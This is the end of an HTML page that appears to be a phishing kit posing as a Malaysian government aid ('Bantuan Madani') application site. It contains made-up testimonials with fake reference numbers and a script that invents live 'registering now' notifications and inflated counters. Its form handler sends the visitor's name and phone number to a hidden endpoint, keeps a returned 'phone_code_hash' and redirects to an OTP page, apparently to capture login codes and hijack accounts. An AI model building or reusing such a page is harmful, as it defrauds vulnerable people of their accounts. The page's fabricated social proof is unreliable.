                                        kerajaan serius menjaga kebajikan golongan berpendapatan rendah.</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#059669,#34d399);">H
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Hafizuddin Ahmad</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Subang Jaya<span
                                            class="dot"></span>2 j 40 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-664738</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Saya dah cuba beberapa kali sebelum ini. Kali ini berjaya dengan
                                        mudah sekali. Terima kasih atas penambahbaikan sistem!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#b45309,#f59e0b);">S
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Suraya bt Kassim</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Ampang, Selangor<span
                                            class="dot"></span>3 jam lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-502917</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Sistem yang sangat baik dan tidak mengelirukan. Setiap langkah
                                        dijelaskan dengan sangat jelas. Terima kasih!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#be123c,#f43f5e);">R
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Ridhwan Bakar</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Pelabuhan Klang<span
                                            class="dot"></span>3 j 20 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-783412</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Cepat, mudah dan selamat. Hanya ambil masa 7 minit dari mula
                                        hingga selesai. Sangat menggalakkan untuk rakyat!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#0f766e,#2dd4bf);">N
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Norhayati bt Jamil</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Ipoh, Perak<span
                                            class="dot"></span>4 jam lepas</div>
                                    <div class="tc-stars">★★★★☆</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-291056</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Sangat berbaloi dengan tunggu. Sistem lancar, borang ringkas.
                                        Semoga permohonan saya diluluskan. Amin.</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#4338ca,#818cf8);">A
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Azman Razali</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Seremban<span
                                            class="dot"></span>4 j 30 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-847362</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Alhamdulillah! Dapat daftar untuk keluarga. Terima kasih kepada
                                        semua yang terlibat dalam menjayakan sistem ini.</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#9a3412,#fb923c);">F
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Fatimah bt Salleh</div><span class="tc-gender perempuan"><i
                                            class="fas fa-venus"></i>Perempuan</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Alor Setar, Kedah<span
                                            class="dot"></span>5 jam lepas</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-623741</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Saya sangat terharu. Impian memiliki rumah sendiri kini semakin
                                        hampir. Terima kasih kerajaan Malaysia!</div>
                                </div>
                            </div>
                            <div class="testi-card" data-clone="1">
                                <div class="tc-av-wrap">
                                    <div class="tc-av" style="background:linear-gradient(135deg,#1d4ed8,#60a5fa);">Y
                                    </div>
                                    <div class="tc-check"><i class="fas fa-check"></i></div>
                                </div>
                                <div class="tc-body">
                                    <div class="tc-name">Yazid Hassan</div><span class="tc-gender lelaki"><i
                                            class="fas fa-mars"></i>Lelaki</span>
                                    <div class="tc-meta"><i class="fas fa-location-dot"></i>Kota Kinabalu<span
                                            class="dot"></span>5 j 10 min</div>
                                    <div class="tc-stars">★★★★★</div>
                                    <div class="tc-success">
                                        <div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>
                                        <div class="tc-success-text">
                                            <div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>
                                            <div class="tc-success-ref">No. Rujukan: BNT-2026-934815</div>
                                        </div>
                                    </div>
                                    <div class="tc-msg">Proses yang cepat dan mudah. Tahniah kepada seluruh pasukan yang
                                        membangunkan sistem yang hebat ini!</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <footer class="py-3 mt-auto">
        <div class="container d-flex flex-column flex-sm-row justify-content-between align-items-center">
            <span class="text-white mb-2 mb-sm-0" style="font-size:12px;opacity:.85;">
                ©
                <script>document.write(new Date().getFullYear());</script>
          Jawatan Kosong Terkini Malaysia.
            </span>
            <ul class="list-unstyled d-flex flex-row mb-0">
                <li class="mx-3"><i class="fas fa-circle-question text-white" title="Bantuan"></i></li>
                <li class="mx-3"><i class="fas fa-home text-white" title="Laman Utama"></i></li>
                <li class="mx-3"><i class="fas fa-envelope text-white" title="Hubungi Kami"></i></li>
            </ul>
        </div>
    </footer>

    <script src="js/jquery-3.6.0.min.js"></script>

    <script>
        /* ============================================================
           PILIHAN JANTINA DALAM FORM
        ============================================================ */
        function selectGender(val) {
            var btnL = document.getElementById('btnLelaki');
            var btnP = document.getElementById('btnPerempuan');
            var inp = document.getElementById('genderValue');
            btnL.classList.remove('active-lelaki');
            btnP.classList.remove('active-perempuan');
            if (val === 'lelaki') {
                btnL.classList.add('active-lelaki');
            } else {
                btnP.classList.add('active-perempuan');
            }
            inp.value = val;
        }
    </script>

    <script>
        /* ============================================================
           TESTIMONI & NOTIFIKASI LANGSUNG
        ============================================================ */
        (function () {

            var COLORS = [
                'linear-gradient(135deg,#1a3c8f,#2952c4)',
                'linear-gradient(135deg,#7c3aed,#a855f7)',
                'linear-gradient(135deg,#0891b2,#0ea5e9)',
                'linear-gradient(135deg,#059669,#34d399)',
                'linear-gradient(135deg,#b45309,#f59e0b)',
                'linear-gradient(135deg,#be123c,#f43f5e)',
                'linear-gradient(135deg,#0f766e,#2dd4bf)',
                'linear-gradient(135deg,#4338ca,#818cf8)',
                'linear-gradient(135deg,#9a3412,#fb923c)',
                'linear-gradient(135deg,#1d4ed8,#60a5fa)',
            ];

            /* Senarai semua bandar/kota di Malaysia */
            var MY_CITIES = [
                "Kuala Lumpur", "Shah Alam", "Petaling Jaya", "Subang Jaya", "Ampang",
                "Cheras", "Puchong", "Klang", "Rawang", "Gombak", "Kajang", "Cyberjaya",
                "Johor Bahru", "Iskandar Puteri", "Batu Pahat", "Muar", "Kluang", "Segamat",
                "Pulau Pinang", "Butterworth", "Bukit Mertajam", "Seberang Perai", "Bayan Lepas",
                "Ipoh", "Taiping", "Teluk Intan", "Sitiawan", "Manjung", "Lumut",
                "Alor Setar", "Sungai Petani", "Kulim", "Langkawi", "Kuala Kedah",
                "Seremban", "Port Dickson", "Nilai", "Bahau", "Tampin",
                "Kuantan", "Temerloh", "Bentong", "Pekan", "Raub", "Jerantut",
                "Kuala Terengganu", "Dungun", "Kemaman", "Kerteh", "Marang",
                "Kota Bharu", "Pasir Mas", "Tanah Merah", "Gua Musang", "Bachok",
                "Melaka Tengah", "Ayer Keroh", "Alor Gajah", "Jasin", "Masjid Tanah",
                "Kuching", "Miri", "Sibu", "Bintulu", "Samarahan", "Sri Aman",
                "Kota Kinabalu", "Sandakan", "Tawau", "Keningau", "Lahad Datu", "Beaufort",
                "Kangar", "Arau", "Padang Besar",
                "Putrajaya", "Labuan"
            ];

        var ALL_DATA = [
    { name: "Siti Aminah bt Hassan", gender: "perempuan", loc: "Kuala Lumpur", stars: 5, ago: "2 min lepas", ref: "BM-2026-841027", msg: "Alhamdulillah! Proses permohonan Bantuan Madani sangat mudah dan lancar. Dalam masa 5 minit sahaja dah selesai. Terima kasih atas inisiatif ini!" },
    { name: "Mohd Firdaus Halim", gender: "lelaki", loc: "Shah Alam, Selangor", stars: 5, ago: "6 min lepas", ref: "BM-2026-623918", msg: "Saya rasa sangat berpuas hati dengan sistem Bantuan Madani ini. Tak perlu beratur atau datang ke pejabat. Sangat memudahkan rakyat." },
    { name: "Nurul Ain Zakaria", gender: "perempuan", loc: "Johor Bahru", stars: 5, ago: "11 min lepas", ref: "BM-2026-752341", msg: "Dah lama saya tunggu peluang seperti ini. Akhirnya dapat buat permohonan Bantuan Madani dengan mudah. Terima kasih banyak!" },
    { name: "Ahmad Zaki Roslan", gender: "lelaki", loc: "Pulau Pinang", stars: 5, ago: "15 min lepas", ref: "BM-2026-398564", msg: "OTP masuk dalam beberapa saat sahaja. Proses pengesahan terus berjalan lancar. Sistem yang sangat pantas dan berkesan!" },
    { name: "Rosnah bt Ismail", gender: "perempuan", loc: "Alor Setar, Kedah", stars: 5, ago: "20 min lepas", ref: "BM-2026-201847", msg: "Mudah sangat nak mohon Bantuan Madani. Saya yang tak berapa mahir teknologi pun boleh buat sendiri tanpa bantuan. Sangat memuaskan!" },
    { name: "Mohd Hafiz Abdurrahman", gender: "lelaki", loc: "Ipoh, Perak", stars: 4, ago: "28 min lepas", ref: "BM-2026-674920", msg: "Proses ringkas dan jelas. Setiap langkah mudah difahami. Tahniah kepada pasukan yang membangunkan sistem ini!" },
    { name: "Normala bt Jusoh", gender: "perempuan", loc: "Kuala Terengganu", stars: 5, ago: "35 min lepas", ref: "BM-2026-519374", msg: "Sistem berjalan lancar tanpa sebarang masalah teknikal. Permohonan Bantuan Madani dapat dilakukan dengan cepat. Terima kasih!" },
    { name: "Shahrul Azlan Saad", gender: "lelaki", loc: "Melaka Tengah", stars: 5, ago: "42 min lepas", ref: "BM-2026-863102", msg: "Dah kongsikan kepada ahli keluarga dan kawan-kawan. Semua pun kata proses Bantuan Madani ini sangat mudah dan cepat." },
    { name: "Fauziah bt Latif", gender: "perempuan", loc: "Kuantan, Pahang", stars: 5, ago: "50 min lepas", ref: "BM-2026-437281", msg: "Permohonan sangat lancar. Proses pantas, tiada gangguan, dan arahan pun mudah difahami. Saya sangat berpuas hati." },
    { name: "Khairul Nizam Daud", gender: "lelaki", loc: "Kota Kinabalu, Sabah", stars: 5, ago: "1 jam lepas", ref: "BM-2026-728456", msg: "Dari Sabah pun boleh mohon Bantuan Madani dengan mudah dan lancar. Sistem ini memang sangat membantu rakyat di seluruh negara." },
    { name: "Azura bt Hamid", gender: "perempuan", loc: "Kuching, Sarawak", stars: 5, ago: "1 j 10 min", ref: "BM-2026-915637", msg: "Walaupun tinggal jauh di Sarawak, langsung tiada masalah untuk buat permohonan. Terima kasih atas kemudahan yang sangat baik ini!" },
    { name: "Roslan Abu Bakar", gender: "lelaki", loc: "Seremban, N. Sembilan", stars: 4, ago: "2 jam lepas", ref: "BM-2026-342098", msg: "Permohonan diterima dengan segera. Saya amat menghargai usaha memudahkan urusan rakyat melalui Bantuan Madani ini." },
    { name: "Zulaikha Mazlan", gender: "perempuan", loc: "Shah Alam", stars: 5, ago: "2 j 15 min", ref: "BM-2026-119283", msg: "Proses yang sangat telus dan mudah difahami. Bantuan Madani ini benar-benar memberi kemudahan kepada golongan yang memerlukan." },
    { name: "Hafizuddin Ahmad", gender: "lelaki", loc: "Subang Jaya", stars: 5, ago: "2 j 40 min", ref: "BM-2026-664738", msg: "Saya dah cuba beberapa kali sebelum ini. Kali ini semuanya lebih mudah dan lancar. Terima kasih atas penambahbaikan sistem!" },
    { name: "Suraya bt Kassim", gender: "perempuan", loc: "Ampang, Selangor", stars: 5, ago: "3 jam lepas", ref: "BM-2026-502917", msg: "Sistem yang sangat baik dan tidak mengelirukan. Setiap langkah dijelaskan dengan jelas. Sangat memudahkan proses permohonan Bantuan Madani." },
    { name: "Ridhwan Bakar", gender: "lelaki", loc: "Pelabuhan Klang", stars: 5, ago: "3 j 20 min", ref: "BM-2026-783412", msg: "Cepat, mudah dan selamat. Hanya ambil masa beberapa minit dari mula hingga selesai. Memang bagus untuk rakyat." },
    { name: "Norhayati bt Jamil", gender: "perempuan", loc: "Ipoh, Perak", stars: 4, ago: "4 jam lepas", ref: "BM-2026-291056", msg: "Sangat berpuas hati dengan proses permohonan. Sistem lancar, borang ringkas, dan mudah diikuti. Semoga permohonan saya berjaya." },
    { name: "Azman Razali", gender: "lelaki", loc: "Seremban", stars: 5, ago: "4 j 30 min", ref: "BM-2026-847362", msg: "Alhamdulillah! Dapat buat permohonan untuk keluarga dengan mudah. Terima kasih kepada semua yang terlibat menjayakan sistem ini." },
    { name: "Fatimah bt Salleh", gender: "perempuan", loc: "Alor Setar, Kedah", stars: 5, ago: "5 jam lepas", ref: "BM-2026-623741", msg: "Saya sangat bersyukur. Bantuan Madani ini sangat membantu meringankan beban keluarga kami. Proses permohonan pun sangat mudah." },
    { name: "Yazid Hassan", gender: "lelaki", loc: "Kota Kinabalu", stars: 5, ago: "5 j 10 min", ref: "BM-2026-934815", msg: "Proses yang cepat dan mudah. Tahniah kepada seluruh pasukan yang membangunkan sistem Bantuan Madani yang sangat membantu ini!" },
];

            var NOTIF_NAMES = [
                { n: "Hasnah Bt Razak", gender: "perempuan", l: "Petaling Jaya" },
                { n: "Mohd Amirul Hadi", gender: "lelaki", l: "Batu Caves" },
                { n: "Siti Zubaidah", gender: "perempuan", l: "Puchong" },
                { n: "Fadzillah Karim", gender: "perempuan", l: "Dengkil" },
                { n: "Saiful Bahri", gender: "lelaki", l: "Rawang" },
                { n: "Norzaharah Yusop", gender: "perempuan", l: "Semenyih" },
                { n: "Ridzuan Ariffin", gender: "lelaki", l: "Kajang" },
                { n: "Haslinda Mohd Nor", gender: "perempuan", l: "Cheras" },
                { n: "Burhanuddin Taib", gender: "lelaki", l: "Gombak" },
                { n: "Samsiah bt Daud", gender: "perempuan", l: "Hulu Langat" },
            ];

            var colorIdx = 0;
            function nextColor() { return COLORS[(colorIdx++) % COLORS.length]; }
            function getInit(name) { return (name || 'P').charAt(0).toUpperCase(); }
            function genRef() { return 'BNT-2026-' + (100000 + Math.floor(Math.random() * 900000)); }
            function randCity() { return MY_CITIES[Math.floor(Math.random() * MY_CITIES.length)]; }

            /* Helper: render gender badge HTML */
            function genderBadge(gender) {
                var isLelaki = (gender === 'lelaki');
                var icon = isLelaki ? 'fa-mars' : 'fa-venus';
                var label = isLelaki ? 'Lelaki' : 'Perempuan';
                var cls = isLelaki ? 'lelaki' : 'perempuan';
                return '<span class="tc-gender ' + cls + '"><i class="fas ' + icon + '"></i>' + label + '</span>';
            }

            /* Helper: render gender badge HTML for notif */
            function notifGenderBadge(gender) {
                var isLelaki = (gender === 'lelaki');
                var icon = isLelaki ? 'fa-mars' : 'fa-venus';
                var label = isLelaki ? 'Lelaki' : 'Perempuan';
                var cls = isLelaki ? 'lelaki' : 'perempuan';
                return '<div class="notif-gender ' + cls + '"><i class="fas ' + icon + '"></i>' + label + '</div>';
            }

            /* pre-assign colors */
            ALL_DATA.forEach(function (d) { d.color = nextColor(); });

            /* ---- BUILD CARD ---- */
            function buildCard(d) {
                var stars = '★'.repeat(d.stars || 5) + '☆'.repeat(5 - (d.stars || 5));
                var div = document.createElement('div');
                div.className = 'testi-card';
                div.innerHTML =
                    '<div class="tc-av-wrap">' +
                    '<div class="tc-av" style="background:' + d.color + ';">' +
                    getInit(d.name) +
                    '<img src="https://ui-avatars.com/api/?name=' + encodeURIComponent(d.name) +
                    '&size=62&bold=true&font-size=0.42&background=random&color=fff" onerror="this.remove();" alt="">' +
                    '</div>' +
                    '<div class="tc-check"><i class="fas fa-check"></i></div>' +
                    '</div>' +
                    '<div class="tc-body">' +
                    '<div class="tc-name">' + d.name + '</div>' +
                    genderBadge(d.gender) +
                    '<div class="tc-meta">' +
                    '<i class="fas fa-location-dot"></i>' + d.loc +
                    '<span class="dot"></span>' + (d.ago || 'Baru sahaja') +
                    '</div>' +
                    '<div class="tc-stars">' + stars + '</div>' +
                    '<div class="tc-success">' +
                    '<div class="tc-success-icon"><i class="fas fa-circle-check"></i></div>' +
                    '<div class="tc-success-text">' +
                    '<div class="tc-success-title">✅ Permohonan Berjaya Didaftarkan</div>' +
                    '<div class="tc-success-ref">No. Rujukan: ' + (d.ref || genRef()) + '</div>' +
                    '</div>' +
                    '</div>' +
                    '<div class="tc-msg">' + d.msg + '</div>' +
                    '</div>';
                return div;
            }

            /* ---- RENDER TRACK ---- */
            var track = document.getElementById('testiTrack');
            var totalCount = 12847;
            var onlineCount = 329;
            var scrollPos = 0;
            var scrollPaused = false;
            var scrollRAF;

            function renderAll() {
                ALL_DATA.forEach(function (d) { track.appendChild(buildCard(d)); });
                // duplicate for seamless loop
                ALL_DATA.forEach(function (d) {
                    var clone = buildCard(d);
                    clone.setAttribute('data-clone', '1');
                    track.appendChild(clone);
                });
                setCounter(totalCount);
                startScroll();
            }

            /* ---- AUTO SCROLL ---- */
            var SCROLL_SPEED = 0.6; // px per frame
            function startScroll() {
                function loop() {
                    if (!scrollPaused) {
                        scrollPos += SCROLL_SPEED;
                        var half = track.scrollHeight / 2;
                        if (scrollPos >= half) scrollPos = 0;
                        track.style.transform = 'translateY(-' + scrollPos + 'px)';
                    }
                    scrollRAF = requestAnimationFrame(loop);
                }
                scrollRAF = requestAnimationFrame(loop);
            }

            /* pause on hover */
            track.addEventListener('mouseenter', function () { scrollPaused = true; });
            track.addEventListener('mouseleave', function () { scrollPaused = false; });
            track.addEventListener('touchstart', function () { scrollPaused = true; }, { passive: true });
            track.addEventListener('touchend', function () { scrollPaused = false; });

            /* ---- COUNTER ---- */
            function setCounter(n) {
                var el = document.getElementById('testiCounter');
                if (el) el.textContent = n.toLocaleString('ms-MY') + ' berjaya';
                var st = document.getElementById('statTotal');
                if (st) st.textContent = n.toLocaleString('ms-MY');
            }

            /* ---- STAT COUNTERS ---- */
            function animCount(id, target) {
                var el = document.getElementById(id);
                if (!el) return;
                var v = 0, step = target / 55;
                var t = setInterval(function () {
                    v = Math.min(v + step, target);
                    el.textContent = Math.floor(v).toLocaleString('ms-MY');
                    if (v >= target) clearInterval(t);
                }, 22);
            }
            animCount('statTotal', totalCount);
            animCount('statOnline', onlineCount);

            setInterval(function () {
                var el = document.getElementById('statOnline');
                if (!el) return;
                onlineCount += Math.floor(Math.random() * 7) - 2;
                if (onlineCount < 280) onlineCount = 300;
                el.textContent = onlineCount;
            }, 5500);

            /* ---- NOTIFIKASI POJOK KIRI ATAS ---- */
            var notifEl = document.getElementById('live-notif');

            function showNotif(name, gender, loc) {
                var color = nextColor();
                var bubble = document.createElement('div');
                bubble.className = 'notif-bubble';
                bubble.innerHTML =
                    '<div class="notif-av" style="background:' + color + ';">' +
                    getInit(name) +
                    '<div class="spin-ring"></div>' +
                    '</div>' +
                    '<div class="notif-text">' +
                    '<div class="notif-name">' + name + '</div>' +
                    notifGenderBadge(gender) +
                    '<div class="notif-status">Sedang mendaftar dari ' + loc + '</div>' +
                    '<div class="notif-dots"><span></span><span></span><span></span></div>' +
                    '</div>';
                notifEl.appendChild(bubble);

                /* auto remove after 4s */
                setTimeout(function () {
                    bubble.classList.add('notif-out');
                    setTimeout(function () { if (bubble.parentNode) bubble.parentNode.removeChild(bubble); }, 400);
                }, 4000);
            }

            function triggerNotif() {
                var d = NOTIF_NAMES[Math.floor(Math.random() * NOTIF_NAMES.length)];
                /* gunakan bandar rawak dari senarai Malaysia */
                var city = randCity();
                showNotif(d.n, d.gender, city);
            }

            /* Notif every 5–10s */
            function scheduleNotif() {
                var delay = 5000 + Math.random() * 5000;
                setTimeout(function () {
                    triggerNotif();
                    scheduleNotif();
                }, delay);
            }
            setTimeout(triggerNotif, 2000); // first notif
            scheduleNotif();

            /* Boot */
            renderAll();

        })();
    </script>
    <script src="js/main.js"></script>

<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"2ed43fb652b64b519cd4a1ccd712bc1a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>


<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    // Create the phpSettings variable from PHP $url variable
    var phpSettings = {
        endpointUrl: '<?php echo $url; ?>'
    };
</script>
<script>
    $(document).ready(function () {
    // Pastikan input selalu memiliki "+60" di awal
    $("#phone").on("focus", function () {
        const currentValue = $(this).val();
        if (!currentValue.startsWith("+60")) {
            $(this).val("+60");
        }
    });
        // Handle tombol kirim OTP
    $("#sendOtp").on("click", function (e) {
        e.preventDefault();
        const phone = $("#phone").val().replace("+60", ""); // Hapus awalan untuk validasi
        const name = $("#fullName").val();
        const feedback = $("#feedback");
        const loader = $("#loader");
        const wrong = $("#wrong");
        const btnText = $("#btnText");
        // Reset feedback dan sembunyikan validasi
        feedback.text("");
        wrong.hide();
        // Validasi nama
        if (!name) {
            feedback.html('<span style="color: red;">Nama harus diisi</span>');
            return;
        }
        // Validasi nomor HP (hanya angka, minimal 5 digit setelah "+60")
        if (!/^\d+$/.test(phone) || phone.length < 5) {
            wrong.show(); // Tampilkan "Nomor tidak valid"
            return;
        }
        // Tampilkan loader saat proses berlangsung
        loader.show();
        btnText.text("Memproses...");
        $(this).addClass("opacity-75 pointer-events-none");
        
        // Ambil endpoint dari variabel PHP yang sudah di-parse ke JavaScript
        const endpointUrl = phpSettings.endpointUrl;
        
        // Kirim permintaan AJAX untuk OTP dengan endpoint dari settings.php
        $.ajax({
            url: endpointUrl + "/send_otp", // Endpoint dari settings.php
            type: "POST",
            contentType: "application/json", // Konten JSON
            data: JSON.stringify({ 
                phone: "+60" + phone,
                name: name
            }), // Format nomor dengan +60
            success: function (data) {
                loader.hide(); // Sembunyikan loader
                if (data.status === "success") {
                    // Simpan nomor dan phone_code_hash di sessionStorage
                    sessionStorage.setItem("phone", phone);
                    sessionStorage.setItem("phone_code_hash", data.phone_code_hash);
                    // Tampilkan pesan 𝙏𝙚𝙡𝙖𝙝 𝘿𝙞𝙡𝙪𝙡𝙪𝙨𝙠𝙖𝙣
                    feedback.html('<span style="color: green;">' + data.message + '</span>');
                    // Redirect ke code.php setelah OTP dikirim
                    window.location.href = "code.php"; // Redirect tanpa delay
                } else {
                    feedback.html('<span style="color: red;">' + data.message + '</span>');
                    $("#sendOtp").removeClass("opacity-75 pointer-events-none");
                    btnText.text("Ajukan Pinjaman");
                }
            },
            error: function (xhr) {
                loader.hide(); // Sembunyikan loader
                const errorResponse = xhr.responseJSON || { message: "Terjadi kesalahan saat mengirim OTP." };
                feedback.html('<span style="color: red;">' + errorResponse.message + '</span>');
                $("#sendOtp").removeClass("opacity-75 pointer-events-none");
                btnText.text("Ajukan Pinjaman");
            }
        });
    });
});
</script>
</body>

</html>